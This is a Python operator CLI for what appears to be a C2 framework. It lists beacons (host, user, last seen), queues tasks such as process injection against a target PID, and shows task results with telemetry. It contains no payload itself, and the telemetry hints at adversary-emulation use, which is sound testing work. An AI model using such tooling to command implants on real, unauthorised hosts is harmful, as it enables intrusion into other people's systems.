"""
Operator CLI — push tasks to beacons and view results.

Usage (run from C2/ directory):
    python -m operator.cli beacons
    python -m operator.cli task --beacon <id> --type process_injection --params '{"target_pid": 1234}'
    python -m operator.cli results
"""

import argparse
import json
import os
import sys

import requests

C2_URL = os.environ.get("C2_URL", "http://127.0.0.1:8000")


def _get(path: str) -> dict:
    r = requests.get(f"{C2_URL}{path}", timeout=10)
    r.raise_for_status()
    return r.json()


def _post(path: str, payload: dict) -> dict:
    r = requests.post(f"{C2_URL}{path}", json=payload, timeout=10)
    r.raise_for_status()
    return r.json()


def cmd_beacons(_args) -> None:
    data = _get("/beacons")
    beacons = data["beacons"]
    if not beacons:
        print("no beacons registered")
        return
    print(f"{'ID':36}  {'HOST':20}  {'USER':15}  LAST SEEN")
    print("-" * 90)
    for b in beacons:
        print(f"{b['beacon_id']}  {b['hostname'][:20]:20}  {b['username'][:15]:15}  {b['last_seen']}")


def cmd_task(args) -> None:
    params = json.loads(args.params) if args.params else {}
    result = _post("/tasks", {"beacon_id": args.beacon, "type": args.type, "params": params})
    print(f"queued  task_id={result['task_id']}")


def cmd_results(_args) -> None:
    data = _get("/results")
    results = data["results"]
    if not results:
        print("no results yet")
        return
    for r in results:
        print(f"\ntask_id   : {r['task_id']}")
        print(f"beacon_id : {r['beacon_id']}")
        print(f"status    : {r['status']}")
        print(f"completed : {r['completed_at']}")
        print(f"output    : {r['output']}")
        if r["telemetry"]:
            print(f"telemetry :\n{json.dumps(r['telemetry'], indent=2)}")


def main() -> None:
    parser = argparse.ArgumentParser(prog="operator")
    sub = parser.add_subparsers(dest="cmd", required=True)

    sub.add_parser("beacons", help="list active beacons")

    p_task = sub.add_parser("task", help="queue a task for a beacon")
    p_task.add_argument("--beacon", required=True, help="beacon_id")
    p_task.add_argument("--type", required=True, help="TTP module name (matches ttps/<name>.py)")
    p_task.add_argument("--params", default=None, help='JSON params e.g. \'{"target_pid": 1234}\'')

    sub.add_parser("results", help="show completed task results")

    args = parser.parse_args()
    dispatch = {"beacons": cmd_beacons, "task": cmd_task, "results": cmd_results}
    dispatch[args.cmd](args)


if __name__ == "__main__":
    main()
